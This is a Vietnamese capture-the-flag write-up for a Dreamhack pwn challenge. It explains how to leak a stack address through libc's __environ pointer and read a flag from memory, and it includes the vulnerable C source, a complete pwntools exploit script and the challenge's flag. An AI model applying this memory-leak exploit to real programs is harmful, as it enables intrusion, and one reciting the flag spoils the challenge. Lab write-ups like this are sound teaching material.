# __environ

trước khi bước vào giải chall này thì ta cần nghiên cứu qua về **environ ptr (biến môi trường )**, tài liệu đây:

- **dreamhack:** https://learn.dreamhack.io/11#27 **(cách khai thác)**
- **dreamhack:** https://learn.dreamhack.io/270#3 **(tìm hiểu về Environment variables)**

hmm nói nôm na theo ý mình hiểu là như thế này:

- Trong Linux, b**iến môi trường (environment variables)** là các giá trị được lưu trữ trong hệ thống và có thể được sử dụng bởi các tiến trình hoặc chương trình chạy trên hệ thống. 
- **Biến môi trường** cung cấp thông tin về các cài đặt và cấu hình của hệ thống, và chúng có thể được thay đổi hoặc chỉnh sửa tùy theo nhu cầu của người dùng.
- **environ trong linux là một con trỏ kép (double pointer)**. Cụ thể, nó khai báo dưới dạng char **environ.

## source C:

```c 
// Name: environ.c
// Compile: gcc -o environ environ.c

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void sig_handle() {
  exit(0);
}
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  signal(SIGALRM, sig_handle);
  alarm(5);
}

void read_file() {
  char file_buf[4096];

  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}

```

ở đây ta có **hàm read_file** dùng **để đọc file flag và lưu chuỗi kí tự flag vào $rsi**

![image](https://github.com/gookoosss/CTF/assets/128712571/5f3f4b73-80ab-4fb9-b5e4-5ccdd547e28b)


và ta nảy ra ý tưởng khai thác là **ở hàm main ta sẽ nhập địa chỉ rsi vào để in ra flag**

nhưng mà vấn đề ở đây **ta ko hề có địa chỉ stack, chương trình chỉ cho ta địa chỉ của libc**

lúc này ta cần **sử dụng kiến thức environ ptr** mà mình vừa học ở trên

![image](https://github.com/gookoosss/CTF/assets/128712571/f0af24d0-3625-4427-9419-a3728f7dff83)



như ta đã biết thì **biến environ là 1 con trỏ kép**, như trong ảnh trên thì ta lúc này **environ đang lưu 1 địa chỉ stack**

lần nhập ta sẽ **nhập địa chỉ environ từ địa libc base mà ta leak được để có được địa chỉ stack**

![image](https://github.com/gookoosss/CTF/assets/128712571/ff85d25c-a051-4956-9e89-0a6cad59b1b6)


sau đó ta t**ính offset để leak được địa chỉ rsi** luôn

![image](https://github.com/gookoosss/CTF/assets/128712571/d89f9ce9-bab2-432a-a2f5-0648f38e7dc2)


oke bây giờ **ta đã có được $rsi rồi thì ta chỉ cần nhập $rsi vào để in flag** thôi 

![image](https://github.com/gookoosss/CTF/assets/128712571/1e321e76-f6eb-4618-9db3-2bf089075b58)



## script:

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
# p = remote("host3.dreamhack.games", 11479)

context.binary = exe
p = process([exe.path])

gdb.attach(p, gdbscript = '''
b*main+130
b*main+186
c
''')
 
input()        

# 0x21a780

p.recvuntil('stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x21a780
environ = libc.sym['__environ']

log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))
log.info('environ: ' + hex(environ))

p.sendlineafter(b'>', b'1')
p.sendlineafter(b'Addr: ' , str(environ))

stack = u64(p.recv(6) + b'\0\0')
log.info('stack leak: ' + hex(stack))
rcx = stack - 0x1568
log.info('rsi: ' + hex(rcx))

p.sendlineafter(b'>', b'1')
p.sendlineafter(b'Addr: ' , str(rcx))

p.interactive()

# DH{dd7e95bf7ea608017206757444a1ff168720e0d18ded2aef99558d00e063b8a1}

```

## Flag:

DH{dd7e95bf7ea608017206757444a1ff168720e0d18ded2aef99558d00e063b8a1}






